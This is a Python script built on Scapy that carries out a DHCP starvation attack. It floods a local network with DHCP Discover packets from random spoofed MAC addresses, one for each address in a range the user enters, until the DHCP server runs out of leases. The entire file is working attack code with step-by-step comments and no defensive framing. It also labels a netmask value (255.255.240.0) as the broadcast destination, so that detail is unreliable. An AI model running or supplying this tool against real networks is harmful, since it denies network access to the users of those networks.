#!/usr/bin/python3
import scapy.all as scapy
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf
from time import sleep
import ipaddress

# Disable IP address checking as we don't need valid source IPs for this attack
conf.checkIPaddr = False

# Input for the network and interface
network_input = input("Enter the network (e.g., 10.0.0.1/20): ")
iface_input = input("Enter the network interface (e.g., wlan0, wlan1): ")

try:
    # Validate and convert the network input into an IPv4Network object
    possible_ips = [str(ip) for ip in ipaddress.IPv4Network(network_input)]
except ValueError:
    print("Invalid network input. Please enter a valid CIDR network.")
    exit()

# Create a DHCP starvation attack.
# This sends requests with unique bogus MAC addresses to exhaust the DHCP server's available IPs.

for ip_add in possible_ips:
    # RandMAC() creates random MAC addresses.
    bog_src_mac = RandMAC()

    # Build DHCP Discover Packet
    # Create an Ethernet frame to broadcast the DHCP Discover packet to all devices
    broadcast = Ether(src=bog_src_mac, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.240.0")  # Source IP 0.0.0.0, destination IP broadcast address

    # For UDP -> sport is the random port of origin, and dport is the DHCP server's port (67)
    udp = UDP(sport=68, dport=67)

    # BOOTP (Bootstrap Protocol) message for DHCP; we use op=1 for the DHCP Discover packet
    bootp = BOOTP(op=1, chaddr=bog_src_mac)

    # The DHCP Discover message, requesting an IP address and containing other DHCP options
    dhcp = DHCP(
        options=[("message-type", "discover"),
                 ("requested_addr", ip_add),
                 ("server-id", "10.0.0.1"),  # You may need to adjust this based on your environment
                 ('end')])

    # Combine all parts into a single packet
    pkt = broadcast / ip / udp / bootp / dhcp

    # Send the packet on the specified interface (Layer 2 - Ethernet)
    sendp(pkt, iface=iface_input, verbose=0)

    # Sleep for 0.4 seconds between sending packets
    sleep(0.4)
    print(f"Sending packet - {ip_add} via interface {iface_input}")
